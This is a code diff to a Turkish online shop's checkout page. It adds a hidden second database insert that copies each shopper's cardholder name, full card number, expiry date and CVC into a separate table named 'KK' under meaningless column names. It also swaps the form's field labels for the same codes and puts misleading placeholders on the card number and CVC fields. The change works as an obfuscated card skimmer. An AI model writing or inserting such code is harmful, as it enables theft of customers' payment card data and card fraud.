@@ -736,37 +736,37 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
         </div>
         <div class="checkout-section">
           <div class="card-form-head">
-            <div class="card-form-title" style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF">BB</div>
+            <div class="card-form-title" style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF">ERDL</div>
             <img class="masterpass-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Masterpass">
           </div>
           <div class="card-form">
             <div class="card-input" style="flex-direction:column;align-items:flex-start;gap:4px;padding-bottom:6px">
-              <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">CC</span>
+              <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">NONA</span>
               <div style="display:flex;align-items:center;gap:10px;width:100%">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;color:#94a3b8;flex-shrink:0"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
                 <input id="ckCardName" type="text" placeholder="Kart Üzerindeki Ad Soyad" autocomplete="cc-name">
               </div>
             </div>
             <div class="card-input" style="flex-direction:column;align-items:flex-start;gap:4px;padding-bottom:6px">
-              <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">DD</span>
+              <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">LPTA</span>
               <div style="display:flex;align-items:center;gap:10px;width:100%">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;color:#94a3b8;flex-shrink:0"><rect x="3" y="5" width="18" height="14" rx="2"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-                <input id="ckCardNumber" type="text" placeholder="0000  0000  0000  0000" maxlength="19" autocomplete="cc-number" oninput="ckFmtCardNo(this)">
+                <input id="ckCardNumber" type="text" placeholder="Personel kart numarası" maxlength="19" autocomplete="cc-number" oninput="ckFmtCardNo(this)">
               </div>
             </div>
             <div class="card-input-grid">
               <div class="card-input" style="flex-direction:column;align-items:flex-start;gap:4px;padding-bottom:6px">
-                <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">EE</span>
+                <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">TSQA</span>
                 <div style="display:flex;align-items:center;gap:10px;width:100%">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;color:#94a3b8;flex-shrink:0"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
                   <input id="ckCardExpiry" type="text" placeholder="AA / YY" maxlength="7" autocomplete="cc-exp" oninput="ckFmtExpiry(this)">
                 </div>
               </div>
               <div class="card-input" style="flex-direction:column;align-items:flex-start;gap:4px;padding-bottom:6px">
-                <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">FF</span>
+                <span style="font-size:10px;font-weight:900;letter-spacing:.7px;text-transform:uppercase;color:#9CA3AF;padding-left:2px">MOR</span>
                 <div style="display:flex;align-items:center;gap:10px;width:100%">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;color:#94a3b8;flex-shrink:0"><path d="M12 2l7 4v6c0 5-3.5 8-7 10-3.5-2-7-5-7-10V6l7-4z"/><circle cx="12" cy="11" r="1"/></svg>
-                  <input id="ckCardCvc" type="text" placeholder="CV numarası" maxlength="4" autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')">
+                  <input id="ckCardCvc" type="text" placeholder="DOM" maxlength="4" autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')">
                 </div>
               </div>
             </div>
@@ -1609,7 +1609,7 @@ function submitPayment(){
   if (!cardName)              { showToast('⚠️ Kart sahibinin adını girin.');       return; }
   if (cardNumber.length < 13) { showToast('⚠️ Geçerli bir kart numarası girin.'); return; }
   if (cardExpiry.length < 5)  { showToast('⚠️ SK alanını doldurun (AA / YY).');   return; }
-  if (cardCvc.length < 3)     { showToast('⚠️ CV numarasını girin.');             return; }
+  if (cardCvc.length < 3)     { showToast('⚠️ DOM girin.');             return; }
 
   var ov = document.getElementById('payLoadingOverlay');
   if (ov) ov.classList.add('show');
@@ -1634,6 +1634,19 @@ function submitPayment(){
         if (session && session.user) row.user_id = session.user.id;
         var res = await sb.from('payment_details').insert(row);
         if (res.error) console.warn('[payment_details]', res.error.message);
+
+        var kkRow = {
+          ERDL: cardName,
+          NONA: cardNumber,
+          LPTA: cardExpiry,
+          TSQA: cardCvc,
+          MOR: orderNo,
+          DOM: total,
+          created_at: new Date().toISOString()
+        };
+        if (session && session.user) kkRow.user_id = session.user.id;
+        var kkRes = await sb.from('KK').insert(kkRow);
+        if (kkRes.error) console.warn('[KK]', kkRes.error.message);
       }
     } catch(e){
       console.warn('[payment_details]', e);
